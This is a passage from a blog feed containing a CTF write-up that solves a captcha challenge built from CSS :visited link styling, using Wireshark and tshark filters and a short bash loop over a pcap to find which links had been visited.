	  width: 300px;
	  height: 100px;
	  margin-right: auto;
	  margin-left: auto;
	  position: relative;
	  background-color: #000000;
	  white-space-collapse: discard;
	}
	#captcha a {
	  font-size: 15px;
	  pointer-events: none;
	  cursor: default;
	  -webkit-touch-callout: none;
	  -webkit-user-select: none;
	  -khtml-user-select: none;
	  -moz-user-select: none;
	  -ms-user-select: none;
	  user-select: none;
	  position: absolute;
	  display: inline-block;
	}
	#captcha a,
	#captcha a:hover,
	#captcha a:focus {
	  color: #000000;
	}
	#captcha a:visited {
	  color: #ff0000;
	}
	#captcha a:nth-child(1) {
	  left: 3.45699886px;
	  top: 26.46903004px;
	  -webkit-transform: rotate(-3.45879735deg);
	  -ms-transform: rotate(-3.45879735deg);
	  transform: rotate(-3.45879735deg);
	}
	#captcha a:nth-child(2) {
	  left: 19.42964103px;
	  top: 28.76705699px;
	  -webkit-transform: rotate(-9.34001927deg);
	  -ms-transform: rotate(-9.34001927deg);
	  transform: rotate(-9.34001927deg);
	}
</code></p>

<p>Oh… Ok, now i get it, the links are building the captcha!</p>

<p>Let’s try this out: i tried to visit one of the links from the page source, so that they would appear as visited to the browser, and by refreshing the captcha page i was presented with a pleasant surprise.</p>

<p><img class="center" src="/images/2014-10-09/partial_captcha.png"></p>

<p>So now i had the point of the challenge! Basically the captcha string depended on the sites visited by the user, what i needed to do, to obtain the captcha string was to verify which sites among the ones in the captcha page were present in the pcap, respecting the following criteria:</p>

<ul>
  <li>the site should have been visited before http://captcha.ctf.sharif.edu/captcha/ was visited (there were a couple of browsing sessions after that)</li>
  <li>the source ip address should have been the same (better making sure not to include other potential users)</li>
  <li>the browser used should have been always the same as the one used for visiting the captcha page (in the pcap multiple user agents were present)</li>
</ul>

<p>doing the search by end in wireshark would have been frustrating, even by using filters, so i created a filter like the following</p>

<pre><code>frame.number &lt; 14127 &amp;&amp; ip.src == 10.10.12.30 &amp;&amp; http.user_agent == "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.11 (KHTML, like Gecko) Ubuntu/12.04 Chromium/20.0.1132.47 Chrome/20.0.1132.47 Safari/536.11" &amp;&amp; http.request.full_uri == ""
</code></pre>

<p>And with the help of some basic bash scripting i cycled through the links in the captcha page to see if they were visited or not.</p>

<p>&#8220;`bash
	#!/bin/bash</p>

<pre><code>URLS=$(grep "a href" captcha.htm | awk -F '\"' '{print $2}')

for url in $URLS; do
		FILTER="frame.number &lt; 14127 &amp;&amp; ip.src == 10.10.12.30 &amp;&amp; http.user_agent == \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.11 (KHTML, like Gecko) Ubuntu/12.04 Chromium/20.0.1132.47 Chrome/20.0.1132.47 Safari/536.11\" &amp;&amp; http.request.full_uri == \"$url\""
		VISITED=$(tshark -R "$FILTER" -r captcha.pcap 2&gt; /dev/null | wc -l)
		if [ $VISITED -ne 0 ]; then
				echo $url
		fi
done ```
</code></pre>

<p>All was left to do was to take the returned URLs, open them in the browser and see the resulting captcha</p>

<p><img class="center" src="/images/2014-10-09/solvedcaptcha.png"></p>

<p>What else can i say? well, i think i’ll probably submit this pcap file to the Xplico dev team so that they can check why <em>style.css</em> wasn’t decoded properly.</p>
]]></content>
  </entry>
  
</feed>
